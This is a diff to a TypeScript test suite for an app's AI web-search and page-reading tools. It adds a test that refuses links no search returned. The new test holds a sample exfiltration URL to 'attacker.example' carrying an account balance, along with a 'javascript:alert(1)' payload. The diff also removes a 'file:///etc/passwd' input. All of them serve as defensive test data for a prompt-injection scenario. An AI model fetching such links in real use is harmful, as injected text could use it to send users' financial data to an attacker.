@@ -15,13 +15,16 @@ const web: WebResearch = {
     lookups.search.push([query, country]);
     if (fail) throw fail;
     return [
-      {
-        title: "Blue Bottle Coffee",
-        url: "https://bluebottlecoffee.com/",
-        site: "bluebottlecoffee.com",
-        snippet: "Specialty coffee roaster and cafés.",
-      },
-    ];
+      ["Blue Bottle Coffee", "https://bluebottlecoffee.com/"],
+      ["Blue Bottle on Yelp", "https://www.yelp.com/biz/blue-bottle"],
+      ["Blue Bottle cafés", "https://bluebottlecoffee.com/cafes"],
+      ["Blue Bottle menu", "https://bluebottlecoffee.com/menu"],
+    ].map(([title = "", url = ""]) => ({
+      title,
+      url,
+      site: new URL(url).hostname,
+      snippet: "Specialty coffee roaster and cafés.",
+    }));
   },
   async read(urls) {
     lookups.read.push(urls);
@@ -127,7 +130,7 @@ describe("AI web search", () => {
     }
   });
 
-  it("looks up a payee and reads its pages without asking", async () => {
+  it("looks up a payee and reads pages its search found, without asking", async () => {
     model.setResponses([
       {
         toolCalls: [
@@ -140,11 +143,10 @@ describe("AI web search", () => {
             name: "readWebPage",
             input: {
               urls: [
-                "https://bluebottlecoffee.com/",
-                "file:///etc/passwd",
-                "https://a.example/",
-                "https://b.example/",
-                "https://c.example/",
+                "HTTPS://BlueBottleCoffee.com",
+                "https://www.yelp.com/biz/blue-bottle",
+                "https://bluebottlecoffee.com/cafes",
+                "https://bluebottlecoffee.com/menu",
               ],
             },
           },
@@ -155,21 +157,52 @@ describe("AI web search", () => {
     const { results, outcome } = await chatTurn(withWeb.app, "Add $6 at Blue Bottle");
     expect(outcome).not.toBe("interrupt");
     expect(lookups.search).toEqual([["Blue Bottle Oakland", "us"]]);
-    // Only http(s), and at most three.
+    // At most three, matched however the model wrote the link.
     expect(lookups.read).toEqual([
-      ["https://bluebottlecoffee.com/", "https://a.example/", "https://b.example/"],
+      [
+        "https://bluebottlecoffee.com/",
+        "https://www.yelp.com/biz/blue-bottle",
+        "https://bluebottlecoffee.com/cafes",
+      ],
     ]);
     const [search, read] = results as [
       { results: { title: string }[] },
       { pages: { text: string }[]; failed: { url: string; error: string }[] },
     ];
-    expect(search.results.map((r) => r.title)).toEqual(["Blue Bottle Coffee"]);
+    expect(search.results[0]?.title).toBe("Blue Bottle Coffee");
     // Long pages are cut.
     expect(read.pages[0]?.text.length).toBeLessThan(8_100);
     expect(read.pages[0]?.text).toMatch(/\[…cut\]$/);
     expect(read.failed).toEqual([
-      { url: "https://a.example/", error: "bot_blocked" },
-      { url: "https://b.example/", error: "bot_blocked" },
+      { url: "https://www.yelp.com/biz/blue-bottle", error: "bot_blocked" },
+      { url: "https://bluebottlecoffee.com/cafes", error: "bot_blocked" },
+    ]);
+  });
+
+  it("won't read a link no search returned, so injected text can't send data out", async () => {
+    const leak = "https://attacker.example/?d=Checking%205000";
+    model.setResponses([
+      // Before any search, nothing can be read.
+      { toolCalls: [{ name: "readWebPage", input: { urls: [leak] } }] },
+      { toolCalls: [{ name: "searchWeb", input: { query: "Blue Bottle" } }] },
+      // After one, only its links: the rest are refused, never fetched.
+      {
+        toolCalls: [
+          {
+            name: "readWebPage",
+            input: { urls: [leak, "https://bluebottlecoffee.com/", "javascript:alert(1)"] },
+          },
+        ],
+      },
+      { text: "Done." },
+    ]);
+    const { results } = await chatTurn(withWeb.app, "Add $6 at Blue Bottle");
+    const refused = "Only links from a searchWeb result can be read";
+    expect(results[0]).toEqual({ pages: [], failed: [{ url: leak, error: refused }] });
+    expect(lookups.read).toEqual([["https://bluebottlecoffee.com/"]]);
+    expect((results[2] as { failed: unknown[] }).failed).toEqual([
+      { url: leak, error: refused },
+      { url: "javascript:alert(1)", error: refused },
     ]);
   });
 
@@ -179,7 +212,7 @@ describe("AI web search", () => {
     });
     model.setResponses([
       { toolCalls: [{ name: "searchWeb", input: { query: "Blue Bottle" } }] },
-      { toolCalls: [{ name: "readWebPage", input: { urls: ["ftp://nope"] } }] },
+      { toolCalls: [{ name: "readWebPage", input: { urls: [] } }] },
       { text: "I couldn't look that up, so which category is it?" },
     ]);
     const { results } = await chatTurn(withWeb.app, "Add $6 at Blue Bottle");
@@ -187,7 +220,7 @@ describe("AI web search", () => {
       {
         error: { code: "WEB_UNAVAILABLE", message: "Web search has reached its limit for now" },
       },
-      { error: { code: "BAD_REQUEST", message: "Give one to three http(s) URLs" } },
+      { error: { code: "BAD_REQUEST", message: "Give one to three links" } },
     ]);
     expect(lookups.read).toEqual([]);
   });
